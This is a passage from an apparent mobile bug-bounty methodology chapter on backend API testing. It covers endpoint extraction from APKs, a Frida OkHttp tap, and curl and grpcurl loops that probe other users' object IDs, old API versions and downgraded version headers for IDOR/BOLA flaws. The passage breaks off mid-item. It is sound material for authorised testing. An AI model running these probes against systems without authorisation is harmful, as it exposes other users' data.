# D15 · Backend API, IDOR/BOLA, Mass Assignment & Business Logic

> This is the server-side half of a mobile engagement: the endpoint map you recover from the client, and every
> authorisation, binding and business-rule decision the backend makes about requests that map produces. Unlike
> every client-side domain, nothing here is pinned to P5 — the ceiling is a genuine **P1**
> (`broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers`), and on most
> engagements this domain carries the Criticals on its own.

| | |
|---|---|
| **Phases** | P6 network & backend API (the sweep), P7 chaining & escalation (composing a read-IDOR into ATO/money/privilege) |
| **Milestones** | M6, M7 |
| **VRT ceiling** | `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (**P1**); also reachable at P1: `broken_authentication_and_session_management.authentication_bypass`, `server_security_misconfiguration.exposed_portal.admin_portal`, `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset`. Write-only IDOR is P2 (`.modify_sensitive_information_iterable_object_identifiers`), read-only P3 (`.view_sensitive_information_iterable_object_identifiers`), GUID-keyed P4 (`.modify_view_sensitive_information_guid`), non-sensitive P5 (`.view_non_sensitive_information`). Business logic has **no VRT leaf** — carry it with CVSS and the money |
| **Primary attacker model** | **AM-05** another user of the same app (the two-owned-account cross-account matrix). **AM-01** remote no interaction for unauthenticated/mobile-only/legacy routes. AM-02 for the CORS and mutation-over-GET variants. AM-12 (own rooted device) is the *harness*, never the attack — every finding here must reproduce from `curl` on a machine that never ran the app |
| **Maps to** | MASVS-AUTH-1, MASVS-CODE-2, MASVS-CODE-4, MASVS-RESILIENCE-3; MASTG-TECH-0022, -0011, -0012, -0010, -0043, -0008; MASTG-TEST-0392, -0382, -0338, -0237, -0238, -0236, -0217, -0002 (deprecated); MASWE-0018 (CWE-862, CWE-863), MASWE-0043, MASWE-0057, MASWE-0062, MASWE-0050 (CWE-20, CWE-89, CWE-116); MASTG-KNOW-0023, MASTG-KNOW-0036, MASTG-BEST-0066, MASTG-TOOL-0125. **MASTG has no Android test for IDOR/BOLA, mass assignment, rate limiting or server-side authorisation — the MAS project scopes itself to the client. That is a known gap, not a low priority.** OWASP API Security Top 10 2023 API1, API2, API3, API4, API5, API6, API7, API8, API9, API10; OWASP Mobile Top 10 2024 M3, M4, M8; WSTG-BUSL-01 … -06; CWE-932 (the VRT `idor` node), CWE-269, CWE-862, CWE-863, CWE-306, CWE-20; ATT&CK T1428 Exploitation of Remote Services, T1641 / T1641.001 Data Manipulation, T1643, T1633.001, T1630.003, T1636.004, T1426, mitigation M1002 Attestation |

## Why this domain pays

Three independent sources in the corpus say the same thing without coordinating. Bugcrowd's own mobile
guidance: *"the network and server related vulnerabilities are where the higher impact vulnerabilities are
found."* The senior-researcher corpus: IDOR/BOLA through the mobile API is *"consistently the best-paying
app-layer class because impact is self-evident and server-side."* The MAS project concedes the same by
omission — it has no client-side test for any of it. On a platform grid like YesWeHack's Gojek Android scope
(Critical $3,500 / High $1,800 / Medium $600 / Low $50), a P5 mobile misconfiguration pays nothing and one
cross-account read pays the top band.

The structural reason is specific and worth stating in the report: a mobile backend is usually an **older,
less-reviewed second surface**. The app's hardcoded calls are frequently an older API version than the web
app uses, kept alive because old installs must keep working, with weaker auth, weaker rate limits, weaker
input validation and more field exposure. Mobile builds are the number-one source of live legacy endpoints.
The bug is never "there is a v1" — a version difference alone is **Informational** — the bug is the
*weakened control* you demonstrate on the old path with the same request, side by side. This is the highest
value structural idea available on a mobile engagement and it is why D15 is worked from the endpoint map
rather than from the proxy history.

The honest counterweight is false positives. This domain generates more retractions than any other, and all
of them are avoidable: a 200 that contains your own session-scoped data, a hash differential that was an
unordered collection serialised twice, a 400 "field X is required" that never passed the auth layer because a
body parser sits in front of it, a timing outlier that collapses at n=10, a status-code flip whose body is
byte-identical. The discipline items (D15-020 … D15-033) are not preamble — they are the difference between
eleven impact-demonstrated findings and thirteen of which two fall apart at triage. Run them first, and
record the negatives they produce: *"every invalid variant returns a byte-identical response, so injection at
this parameter is structurally ruled out"* is a deliverable, not an absence of one.

## The crux question

**For every object identifier and every security-relevant field the client is capable of sending, does the
server re-derive the answer from its own state — or does it trust the identifier, the field, the version, the
header or the client's arithmetic?**

## Triage order

1. **The cross-boundary curl check (D15-021).** Two minutes, and it decides the shape of the entire phase: if
   the token works off-device the whole sweep is scriptable; if it does not, you test through the app.
2. **Build the endpoint map from the binary (D15-001 … D15-011).** The proxy shows what the UI happened to
   exercise; the binary shows everything the client *can* call. Working from proxy history alone is the single
   biggest coverage failure in this domain.
3. **The two-account BOLA sweep, read then write separately (D15-034, D15-035).** Highest yield, and the read
   vs write distinction spans P3 to P1 — get it right before anything else.
4. **Mobile-only, legacy-version and role-crossing routes (D15-012, D15-013, D15-017, D15-061, D15-062).** The
   shadow-API delta is where a well-tested web API still bleeds.
5. **Mass assignment from the DTOs (D15-004, D15-064 … D15-066).** The model classes hand you the exact wire
   names; guessing field names produces noise.
6. **Business logic and races on money (D15-076 … D15-085).** Lowest duplication rate in the whole checklist —
   scanners cannot find these — but they demand ledger-state proof, not a 200.
7. **Rate limiting and enumeration (D15-086, D15-087).** Cheap, and the mobile-vs-web contrast is the
   report's strongest sentence.
8. **Everything else only after the discipline items have produced a documented baseline.** A differential you
   cannot defend is worse than no differential.

## Items

### D15-001 · Harvest the complete Retrofit endpoint map from an R8-minified APK

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (enabler; the authz flaw you then demonstrate is the finding) |
| **Attacker** | AM-12 harness → AM-05/AM-01 targets |
| **Applies to** | Java/Kotlin apps using Retrofit (the dominant Android HTTP stack) |
| **Maps to** | API9:2023 Improper Inventory Management; MASTG-TECH-0022 |

- **Test:** Recover every server route the app is capable of calling. R8/ProGuard renames classes and methods
  but **does not rewrite the string values inside runtime-visible annotations** — Retrofit needs those strings
  at runtime to build the request line, so `@GET("v2/users/{id}/wallet")` survives minification verbatim even
  when the interface is renamed to `a.b.c`. "The build is obfuscated" is never a reason to skip this.
- **How:**
  ```bash
  jadx -d jadx_out --no-debug-info base.apk        # and every split_config.*.apk
  S=jadx_out/sources
  grep -rhoE '@(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS|HTTP)\("[^"]+"\)' $S | sort -u > endpoints.txt
  grep -rhoE '@HTTP\([^)]*\)' $S | sort -u                       # @HTTP hides the verb in a named arg
  grep -rnE '@(GET|POST|PUT|DELETE|PATCH)\("' $S | sed 's#^jadx_out/sources/##' | sort -u > endpoints_with_owner.txt
  wc -l endpoints.txt
  # decompiler choked? the same strings live in the DEX string pool:
  unzip -p base.apk classes*.dex | strings -n 6 | grep -E '^(v[0-9]+|api|1\.0)/' | sort -u
  ```
- **Proof:** `endpoints.txt` containing concrete route templates
  (`1.0/payment-aggregator/users/bank-details/{userId}`), and at least one of them observed in intercepted
  traffic returning 200 — the map is only "proved" when one route from it appears live.
- **Escalation:** Path-parameter routes feed the BOLA sweep (D15-034); body models feed mass assignment
  (D15-004); hosts feed D18; unproxied hosts feed D15-006.
- **Ruled out when:** Never ruled out — it is an inventory step. But **zero grep hits is a stack signal, not a
  clean result**: run the framework check (D15-007) before writing anything down. An app with no Retrofit hits
  and a `libflutter.so` has an endpoint map, just not here.

### D15-002 · Shortlist IDOR candidates by path-parameter shape, not by guesswork

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (enabler) |
| **Attacker** | AM-05 |
| **Applies to** | all REST APIs |
| **Maps to** | API1:2023 Broken Object Level Authorization |

- **Test:** Of the recovered routes, isolate those whose path embeds a client-supplied object identifier. These
  are exactly the endpoints where the server must perform an ownership check and frequently does not, and
  ranking them by data class is what stops you spending the week on the catalogue endpoint.
- **How:**
  ```bash
  grep -rhoE '@(GET|POST|PUT|DELETE|PATCH)\("[^"]*\{[^"]*\}[^"]*"\)' $S | sort -u > idor_candidates.txt
  grep -iE 'bank|card|payment|wallet|refund|order|address|invoice|kyc|document|profile|user|account|ticket|booking|claim|message' idor_candidates.txt
  ```
  For each, open the enclosing interface method and record whether an auth header is attached per-method
  (`@Header("Authorization")`) or globally by an interceptor.
- **Proof:** A table of `METHOD · PATH · ID-PARAM · OWNER-OF-ID · AUTH-SOURCE · DATA-CLASS`. Proof of
  candidacy is the annotation text plus the interface signature; exploitability comes at D15-034.
- **Escalation:** Straight into the two-account replay, and if IDs are sequential (D15-038) into the
  mass-extraction impact statement that moves P3 to P1.
- **Ruled out when:** The API is genuinely identifier-free — every route is `/me`-scoped with the subject taken
  from the token and no route template contains a `{}` segment, in body, query, header or multipart. State that
  you checked all four positions, because an id in a header (`X-User-Id`) is the same bug with no path
  parameter.

### D15-003 · Recover hidden request parameters from Retrofit parameter annotations

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.privilege_escalation` (VARIES) when a recovered parameter changes an authorisation outcome |
| **Attacker** | AM-05 |
| **Applies to** | all Retrofit apps; the same idea applies to Volley/Ktor builders, where keys appear as plain string literals |
| **Maps to** | API3:2023 Broken Object Property Level Authorization |

- **Test:** Enumerate every field name the client is *capable* of sending. `@Query`, `@QueryMap`, `@Field`,
  `@FieldMap`, `@Part`, `@Header`, `@Path` annotation values also survive R8, and routinely include parameters
  the UI never exercises: debug flags, `includeDeleted`, `asUser`, `channel`, `storeId`, `role`.
- **How:**
  ```bash
  grep -rhoE '@(Query|Field|Part|Header|Path)\("[^"]+"\)' $S | sed 's/.*("\(.*\)")/\1/' | sort -u > client_params.txt
  grep -rn '@QueryMap\|@FieldMap\|@PartMap\|@HeaderMap' $S
  grep -iE 'admin|internal|debug|as_?user|impersonat|role|scope|all|include|expand|fields|force|skip|override' client_params.txt
  ```
  Any `@QueryMap Map<String,String>` is an **arbitrary-parameter channel**: the handler accepts whatever the
  app puts in it, so parameter mining against that endpoint is justified rather than speculative.
- **Proof:** `client_params.txt`, plus for each interesting name an intercepted request where the parameter is
  *absent* (establishing it is reachable but unused), then the same request with it added returning a different
  status, length or field set.
- **Escalation:** Directly into mass assignment (D15-064) and BFLA (D15-061) — an `asUser=`/`role=`/`storeId=`
  parameter the server honours is horizontal or vertical escalation in one request.
- **Ruled out when:** Every recovered parameter is present in normal traffic and adding the security-relevant
  ones produces a byte-identical normalised response (D15-024) on an endpoint with a working positive control.
  "The parameter was ignored" needs the normalised diff, not a glance.

### D15-004 · Build the mass-assignment candidate list from the request-body model classes

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (enabler; D15-065 carries the finding) |
| **Attacker** | AM-05 |
| **Applies to** | all JSON APIs; the `@SerializedName` oracle is Android-specific and high-yield |
| **Maps to** | API3:2023 (mass assignment sub-case) |

- **Test:** Read the `*RequestBody`/`*Request`/DTO classes to learn exactly which fields the client is allowed
  to send, and flag the security-relevant ones. **A client-sent security value is not a bug by itself** — the
  server may recompute it from a `cart_session` — so this is an enabling condition until D15-065 confirms the
  server honours it. Do not report the client field alone.
- **How:**
  ```bash
  grep -rln 'RequestBody\|@SerializedName\|@Json(name\|@JsonProperty' $S | head -40
  grep -rhoE '@SerializedName\("[^"]+"\)' $S | sed 's/.*("\(.*\)")/\1/' | sort -u > body_fields.txt
  grep -rhoE '@Json\(name *= *"[^"]+"' $S | sed 's/.*"\(.*\)"/\1/' | sort -u >> body_fields.txt
  sort -u body_fields.txt | grep -iE 'amount|price|total|discount|credit|coupon|status|state|role|isadmin|verified|owner|user_?id|merchant|sender|fee|tax|currency|qty|quantity|tier|balance|limit|kyc'
  ```
  Worked shape from the corpus: `OrderRequestBody` sends `finalCustomerAmount`, `senderId`, `addressId`,
  `creditsToDeduct` — four separate trust questions in one body.
- **Proof:** A per-model table of `FIELD · TYPE · SECURITY MEANING · SERVER RECOMPUTES? (untested/yes/no)`.
- **Escalation:** Each "no" is a D15-065 or D15-082 finding; a field naming the *owner* (`userId`, `senderId`,
  `merchantId`) turns mass assignment into cross-account object creation (D15-042).
- **Ruled out when:** Every security-relevant field in the DTOs is demonstrated to be recomputed server-side —
  send the tampered value, read the object back with a separate GET, and show the server's number, not yours.

### D15-005 · Read the OkHttp interceptor chain and reconstruct the auth envelope byte-for-byte

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (enabler for every off-device replay) |
| **Attacker** | AM-12 harness |
| **Applies to** | all OkHttp-based apps (includes Retrofit, Coil, Firebase transports) |
| **Maps to** | MASVS-AUTH-1; MASTG-TEST-0217 covers the same OkHttp/Retrofit configuration surface |

- **Test:** Determine exactly how the app authenticates every request, because you must reproduce it
  byte-for-byte when you leave the app and drive the API from `curl`. Without this, *"the token doesn't work
  from curl"* is an unproven claim and you will mis-file a harness failure as device binding.
- **How:**
  ```bash
  grep -rn 'implements Interceptor\|: Interceptor\|Interceptor {' $S
  grep -rn 'addInterceptor\|addNetworkInterceptor\|authenticator(' $S
  grep -rn 'newBuilder().header(\|addHeader(' $S | grep -iE 'authorization|bearer|x-|token|sign|hmac|nonce|timestamp|device'
  ```
  Read each `intercept(Chain)` body: it gives you the full header set (`Authorization`, `X-Device-Id`,
  `X-App-Version`, `X-Signature`) and whether a request signature is computed (HMAC over method+path+body+ts).
  `okhttp3.Authenticator` is the 401-refresh hook and tells you the refresh endpoint for free.
- **Proof:** A reconstructed `curl` the server answers with 200, built entirely from interceptor logic. A 401
  means you have missed a header — the interceptor names which.
- **Escalation:** If the signature is computed client-side from a hardcoded key (D12), you can sign arbitrary
  requests and the "device binding" is cosmetic → D15-084.
- **Ruled out when:** n/a — this is an inventory step. It is "complete" when a minimal reconstructed request
  returns the same body the app's own request returned.

### D15-006 · Install a runtime OkHttp tap to capture flows the proxy never shows

| | |
|---|---|
| **Severity ceiling** | Low (the *delta* is what gets rated) |
| **VRT** | n/a (enabler) |
| **Attacker** | AM-12 harness |
| **Applies to** | all OkHttp apps; mandatory when the app bundles Cronet, gRPC, Flutter or Go |
| **Maps to** | MASTG-TEST-0238 (Runtime Use of Network APIs — placeholder test in MASTG beta; this is the technique it describes); MASTG-TEST-0236's stated proxy-vs-capture limitation |

- **Test:** Capture full request/response pairs from inside the process. This is immune to pinning, to
  proxy-unaware clients and to `OkHttpClient`s built with `Proxy.NO_PROXY`. Use it to *complete* the endpoint
  map, not to replace the proxy.
- **How:**
  ```javascript
  // frida -U -p <pid> -l okhttp_tap.js
  Java.perform(function () {
    var Buffer = Java.use("com.android.okhttp.okio.Buffer");
    var Interceptor = Java.use("okhttp3.Interceptor");
    var Tap = Java.registerClass({
      name: "okhttp3.TapInterceptor", implements: [Interceptor],
      methods: { intercept: function (chain) {
          var req = chain.request();
          console.log("[REQ] " + req.method() + " " + req.url() + "\n" + req.headers());
          var body = req.body();
          if (body && body.contentLength() > 0) { var b = Buffer.$new(); body.writeTo(b); console.log(b.readString()); }
          var res = chain.proceed(req);
          console.log("[RES] " + res.code() + "\n" + res.headers());
          return res;
      }}});
    var B = Java.use("okhttp3.OkHttpClient$Builder");
    var tap = Tap.$new();
    B.build.implementation = function () { this.interceptors().add(tap); return this.build(); };
  });
  ```
  Cross-check with a packet capture so you can name what is still missing:
  ```bash
  emulator -avd pt -writable-system -tcpdump cap.pcap -http-proxy 127.0.0.1:8080 &
  tshark -r cap.pcap -Y 'tcp.flags.syn==1 && tcp.flags.ack==0' -T fields -e ip.dst -e tcp.dstport | sort -u
  tshark -r cap.pcap -Y 'udp.dstport==443' -T fields -e ip.dst | sort -u     # QUIC / HTTP-3
  ```
- **Proof:** Request lines and bodies printed for hosts that never appeared in the proxy log — that delta is
  both a testability finding ("traffic bypasses the system proxy") and the missing half of your inventory.
- **Escalation:** Any endpoint visible only here is by definition untested by anyone who relied on a proxy.
- **Ruled out when:** The tap's host set and the pcap's destination set are both subsets of the proxy's host
  set, after exercising the app's full UI including background sync. Note the class is `okhttp3.*` when shaded
  normally; minified builds relocate it — resolve with `Java.enumerateLoadedClasses` filtering on `Interceptor`
  before concluding "no OkHttp".

### D15-007 · Extract the endpoint map from a cross-platform bundle when Retrofit finds nothing

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (enabler) |
| **Attacker** | AM-12 harness |
| **Applies to** | React Native (Hermes/JSC), Flutter, Cordova, Unity, Xamarin/KMP |
| **Maps to** | MASTG-TEST-0237 (Cross-Platform Framework Configurations — `status: placeholder`; the guide explicitly acknowledges cross-platform HTTP stacks are not yet covered); MASTG-TOOL-0125 |

- **Test:** On cross-platform stacks zero Retrofit hits is *expected*, and the endpoint map lives in the
  bundle/snapshot. Getting this wrong produces an "app has no API" conclusion that is simply false and silently
  zeroes the entire chapter. The bundle also contains admin/debug/feature-flagged routes no amount of clicking
  reveals.
- **How:**
  ```bash
  unzip -l base.apk | grep -E 'libhermes|libjsc|index.android.bundle|libflutter|libapp.so|cordova|assets/www'
  # Flutter
  unzip -p base.apk lib/arm64-v8a/libapp.so > libapp.so
  strings -n 6 libapp.so | grep -E '^/?(api|v[0-9])/|https?://' | sort -u
  # React Native, plain JS bundle
  unzip -p base.apk assets/index.android.bundle | grep -aoE 'https?://[^"'"'"']+' | sort -u
  # Hermes bytecode (magic c61fbc03c103191f): strings(1) under-reports badly; parse the string table
  hermes-decomp decompile ext/assets/index.android.bundle -o out/ --deep
  grep -aoE '["'\''`]/(api|v[0-9]+|graphql|internal|admin)[A-Za-z0-9._/{}$-]*' hbc.strings | sort -u
  # Unity / Xamarin
  strings -a out/dump.cs out/assemblies/out/*.dll | grep -aoE 'https?://[^ "]+' | sort -u
  ```
- **Proof:** A route list extracted from the bundle that matches routes observed in the proxy, plus routes that
  do not appear in the proxy at all. For OTA-updating apps, compare the **on-device** bundle's Hermes
  `sourceHash` against the APK's — if they differ, the APK's routes are not the live routes.
- **Escalation:** Bundle strings also yield storage keys, feature-flag names and error strings that let you
  predict server behaviour before you send anything.
- **Ruled out when:** You have identified the framework positively (a named `.so`/bundle asset) and extracted
  its route set. A table adjacency in a Hermes string table is a hint, never proof of a call site — confirm
  live before listing a route as reachable. **LEGACY:** pre-Hermes RN ships plain JS and is trivially
  greppable; Hermes became the RN default from 0.70.

### D15-008 · Locate GraphQL operation documents and persisted-query hashes inside the APK

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (enabler for D15-072 … D15-081) |
| **Attacker** | AM-05 |
| **Applies to** | GraphQL backends |
| **Maps to** | API9:2023; PortSwigger GraphQL (finding endpoints / schema discovery without introspection) |

- **Test:** If the backend is GraphQL the client ships the operation documents (Apollo codegen) or only their
  SHA-256 hashes (Automatic Persisted Queries). Both give you the operation inventory without introspection —
  including admin/internal mutations the mobile UI never calls but the endpoint still serves.
- **How:**
  ```bash
  unzip -l base.apk | grep -iE '\.graphql|\.gql|graphql'
  grep -rn 'operationName\|__typename\|mutation \|query \|subscription ' $S | head -50
  grep -rnE '"[0-9a-f]{64}"' $S | grep -i 'persist\|hash\|apq\|query' | head      # APQ sha256Hash values
  grep -rn 'OPERATION_DOCUMENT\|QUERY_DOCUMENT\|com/apollographql' $S jadx_out/resources 2>/dev/null | head
  ```
- **Proof:** The recovered document text, then that exact operation replayed against `/graphql` returning
  `data` rather than `PersistedQueryNotFound`.
- **Escalation:** Operation names reveal `grantAdminAccess`-shaped mutations → D15-075/D15-079/D15-080.
- **Ruled out when:** No GraphQL transport is present (no `/graphql` route, no Apollo classes, no
  `__typename` strings) — and you confirmed that by probing the common paths in D15-072, not by the absence of
  the word "graphql" in the manifest.

### D15-009 · Recover gRPC service and method names, then drive them with grpcurl

| | |
|---|---|
| **Severity ceiling** | Critical (an unauthenticated or over-privileged admin RPC); Low for exposed reflection alone |
| **VRT** | `cloud_security.misconfigured_services_and_apis.insecure_api_endpoints` (P4) for the reflection exposure; the authz failure rates under `broken_access_control.*` |
| **Attacker** | AM-01 / AM-05 |
| **Applies to** | apps bundling `io.grpc` / `grpc-okhttp` / Cronet+gRPC |
| **Maps to** | API9:2023; API5:2023 Broken Function Level Authorization |

- **Test:** gRPC traffic is invisible to a naive HTTP proxy and is often the *entire* API for newer apps.
  Recover fully-qualified service/method names and message shapes from the binary, then call the service
  directly — the mobile client is not the only client the server will answer.
- **How:**
  ```bash
  # "/package.Service/Method" survives as a string
  unzip -p base.apk classes*.dex | strings -n 8 | grep -E '^/[a-zA-Z0-9_.]+/[A-Za-z0-9_]+$' | sort -u
  grep -rn 'MethodDescriptor\|generateFullMethodName\|io.grpc' $S | head -30
  unzip -l base.apk | grep -iE '\.proto|\.protoset|descriptor'
  grpcurl <host>:443 list
  grpcurl <host>:443 list package.Service
  grpcurl <host>:443 describe package.Service.Method
  grpcurl -H "authorization: Bearer $TOKEN" -d '{"id":"'"$ID_B"'"}' <host>:443 package.Service/GetProfile
  # reflection disabled? use the recovered descriptors
  grpcurl -protoset my-protos.bin list
  grpcurl -import-path ./protos -proto api.proto describe package.Service.Method
  ```
- **Proof:** `grpcurl list` returning a service list is proof that **server reflection is enabled in
  production** (the gRPC analogue of GraphQL introspection, Low/Medium on its own). A successful invocation
  carrying your bearer token proves the endpoint is reachable outside the app.
- **Escalation:** Enumerate every method the app never calls and run D15-034/D15-061 against each.
- **Ruled out when:** No `io.grpc` classes, no `/pkg.Service/Method` strings, and no HTTP/2 flows to a
  non-REST path in the pcap. Reflection disabled *and* every recovered method rejecting a low-privilege token
  with a consistent `PERMISSION_DENIED` is the positive negative.

### D15-010 · Decode and re-encode protobuf bodies without a `.proto`

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (enabler — once you can edit protobuf, every item in this chapter applies to gRPC at the same severities) |
| **Attacker** | AM-12 harness |
| **Applies to** | any protobuf/gRPC backend |
| **Maps to** | protobuf.dev wire-format encoding guide; nccgroup blackboxprotobuf |

- **Test:** Protobuf is self-describing enough to decode blind: each field is `(field_number << 3) | wire_type`
  and the wire type tells the parser how many bytes to consume, so unknown fields can always be skipped. The
  binary encoding is not a security boundary and the report should say so explicitly.
- **How:** Install the Blackbox Protobuf Burp extension (Jython) or its mitmproxy addon; it renders the message
  as an editable tree and re-encodes on send. Wire types: `0 VARINT` (int/bool/enum), `1 I64`, `2 LEN`
  (string/bytes/submessage/packed), `5 I32` (`3`/`4` are deprecated groups).
- **Proof:** A modified field — the varint carrying `quantity`, the LEN field carrying a user id — accepted by
  the server with a changed response.
- **Escalation:** Apply mass assignment by *adding* an unknown field number: `proto3` servers ignore unknown
  fields, but permissive JSON-transcoding gateways may not.
- **Ruled out when:** The body is not protobuf (no varint-consistent parse), or every tampered field produces a
  server-recomputed result read back with a separate call.

### D15-011 · Extract the full host inventory, including staging and QA hosts shipped in the release build

| | |
|---|---|
| **Severity ceiling** | High (a staging host serving production data or lacking production's controls) |
| **VRT** | `cloud_security.misconfigured_services_and_apis.insecure_api_endpoints` (P4); higher when it accepts production credentials |
| **Attacker** | AM-01 |
| **Applies to** | all |
| **Maps to** | API9:2023 (the documented scenario is a beta environment without rate limiting enabling password-reset brute force) |

- **Test:** Find every host the client knows about, not just the one it uses. Staging backends are the classic
  API9 finding: same data, weaker controls, and no WAF.
- **How:**
  ```bash
  apktool d -f -o apktool_out base.apk
  grep -rhoE 'https?://[A-Za-z0-9._-]+(:[0-9]+)?' apktool_out/res apktool_out/assets $S \
    | sed 's#\(https\?://[^/]*\).*#\1#' | sort | uniq -c | sort -rn | head -60
  grep -rn 'BuildConfig' $S | grep -iE 'url|host|endpoint|env|stag|dev|qa|test'
  grep -rn 'BASE_URL\|API_URL\|ENDPOINT' $S | head -40
  apkleaks -f base.apk --json -o apkleaks.json
  apkurlgrep -a base.apk | sort -u > urlgrep.txt
  comm -23 <(sort -u urlgrep.txt) <(sort -u endpoints.txt)   # paths from a second HTTP stack
  ```
- **Proof:** A host list with at least one non-production entry, then a `curl` to that host returning an
  application response (not a parked page), and — the actual finding — production credentials or
  production-shaped data being accepted there.
- **Escalation:** Test the staging host with the *production* account token. If it accepts it, every control
  gap there becomes a production account risk, and key reuse across environments is `cryptographic_weakness.key_reuse.inter_environment` (P2). → D18.
- **Ruled out when:** Every recovered host resolves to production or to a dead name (NXDOMAIN / connection
  refused / a parked page with no application response), and the non-production ones reject production tokens.

### D15-012 · Diff the mobile route set against the web app's — the shadow-API bridge

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) when the mobile-only route is the one missing the check; `cloud_security.misconfigured_services_and_apis.insecure_api_endpoints` (P4) for the exposure alone |
| **Attacker** | AM-01 / AM-05 |
| **Applies to** | any target with both a web and a mobile client |
| **Maps to** | API9:2023 Improper Inventory Management; API3:2023 (excessive data exposure sub-case); Cobalt case study #2 ("identified undisclosed API endpoints through code references", rated High) |

- **Test:** The single highest-value structural idea in a mobile engagement. Mobile clients get endpoints the
  web app does not — bulk sync, device registration, receipt validation, offline reconciliation, feature flags,
  telemetry — and those endpoints have had far fewer eyes on them. Diff the two sets and attack the difference.
- **How:**
  ```bash
  # mobile set from D15-001/-007; web set by browsing the web app through Burp and harvesting /api/ paths from JS
  comm -23 <(sort -u mobile_routes.txt) <(sort -u web_routes.txt) > mobile_only.txt
  while read -r p; do
    printf '%s ' "$p"
    curl -s -o /dev/null -w '%{http_code} ' -H "Authorization: Bearer $TOKEN_LOW" "https://api.target$p"
    curl -s -o /dev/null -w '%{http_code}\n' "https://api.target$p"        # and with no token at all
  done < mobile_only.txt
  ```
  For each mobile-only route ask the four behavioural questions, not the shape question: does it take a
  filter/scope parameter; does it paginate; does it enforce the same authz as its web sibling; does it return
  fields the web sibling redacts.
- **Proof:** A mobile-only route returning fields or record counts the web equivalent redacts or paginates,
  captured side by side with the web request. **A route difference alone is Informational** — the weakened
  control is the finding.
- **Escalation:** Bulk-sync endpoints (D15-046) are the recurring Critical here, and they are also the best
  rate-limit and enumeration targets: one call per thousand records.
- **Ruled out when:** The set difference is empty, or every mobile-only route enforces the same authz, the same
  429 behaviour, the same field redaction and the same input validation as its nearest web sibling —
  demonstrated with the same request against both, not inferred from response shape.

### D15-013 · Walk the API-version ladder with the same token

| | |
|---|---|
| **Severity ceiling** | Critical (an old version that bypasses auth entirely); Medium–High for a rate-limit or field-exposure regression |
| **VRT** | `broken_access_control.idor.*` per the read/write fork; `broken_authentication_and_session_management.authentication_bypass` (P1) when the old path accepts no token |
| **Attacker** | AM-01 / AM-05 |
| **Applies to** | any versioned API; especially apps with a long tail of unforced updates |
| **Maps to** | API9:2023 ("Running multiple versions of an API … expands the attack surface"); API1:2023 when the old version leaks objects |

- **Test:** Mobile backends accumulate versions because old installs must keep working, and the old version is
  the one with the original, weaker authorisation code. Diff **behaviour** across versions for the *same
  operation* on four axes: auth strength, rate limiting, input validation, field exposure.
- **How:**
  ```bash
  grep -oE '"(v[0-9]+(\.[0-9]+)?|[0-9]+\.[0-9]+)/' endpoints.txt | sort -u
  for V in v1 v2 v3 v4 1.0 2.0 3.0 beta alpha internal legacy old; do
    code=$(curl -s -o /tmp/r.json -w '%{http_code}' -H "Authorization: Bearer $TOKEN" \
      "https://api.example.com/$V/users/$OTHER_ID/profile")
    printf '%-8s %s %s\n' "$V" "$code" "$(wc -c < /tmp/r.json)"
  done
  curl -s -H "X-API-Version: 1" https://api.example.com/users
  curl -s -H "Accept: application/vnd.company.v1+json" https://api.example.com/users
  for sub in api api-v1 api-v2 apiv1 apiv2 legacy-api old-api internal-api staging-api; do
    curl -s -o /dev/null -w "%{http_code} $sub\n" "https://$sub.example.com/"
  done
  ```
- **Proof:** The same object id returning `403` on `v3` and `200` with data on `v1` — a status **and body**
  delta on identical input with identical credentials, both captured. Anything but 404/connection-refused means
  live; a static "this version is deprecated" 200 is not a finding.
- **Escalation:** Combine with the User-Agent/app-version downgrade (D15-014) to reach versions the current app
  never calls at all.
- **Ruled out when:** Every neighbouring version returns 404 or a non-executing deprecation stub, **and** the
  versions that are live enforce identical auth, throttling, validation and field sets for the same operation.
  Record the four-axis table; "v1 returns the same JSON" is a response-shape claim, not a behavioural one.

### D15-014 · Downgrade the app-version headers to reach legacy backend routing

| | |
|---|---|
| **Severity ceiling** | Critical (depends on the control missing from the legacy path) |
| **VRT** | `broken_access_control.privilege_escalation` (VARIES) / `broken_access_control.idor.*` |
| **Attacker** | AM-01 / AM-05 |
| **Applies to** | all apps with a long-lived install base |
| **Maps to** | API9:2023 (the beta-environment-without-rate-limiting scenario is the same class) |

- **Test:** Gateways often route by `X-App-Version` or `User-Agent` to keep old installs working. Downgrading
  those headers reaches code paths retired from the current app, including ones without the authorisation
  checks added later. Also test removing the header entirely and sending a version far above the current
  release, which sometimes selects an unreleased/beta backend.
- **How:**
  ```bash
  for v in 1.0.0 2.3.1 4.9.9 99.0.0 ""; do
    printf '%-8s ' "${v:-<absent>}"
    curl -s -o /tmp/o -w '%{http_code} %{size_download}\n' "https://api.example.com/v1/users/$ID_B/profile" \
      -H "Authorization: Bearer $TOKEN_A" \
      ${v:+-H "X-App-Version: $v"} ${v:+-H "User-Agent: ExampleApp/$v (Android 10; SDK 29)"}
  done
  ```
- **Proof:** A status or body delta on identical credentials and identical path, attributable solely to the
  version header. Capture all variants including the absent-header case.
- **Escalation:** A "beta"/"next" value that reaches a separate, less-hardened environment is a new host —
  test it from scratch (D15-011).
- **Ruled out when:** Every version value, including absent and absurd, produces the same normalised response,
  and the interceptor shows the header is informational (logged, not routed).

### D15-015 · Extract the companion-surface (Wear / Auto / TV / widget) endpoint set

| | |
|---|---|
| **Severity ceiling** | Critical (BOLA on a companion-only route) |
| **VRT** | `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) |
| **Attacker** | AM-05 |
| **Applies to** | apps with Wear/Auto/TV/Glance companions |
| **Maps to** | MASWE-0018; the "validates the action but never the caller" pattern |

- **Test:** Companion code paths frequently call *different* endpoints, or the same endpoints with a different
  client id or scope, and were built by a smaller team under time pressure. Extract those endpoints
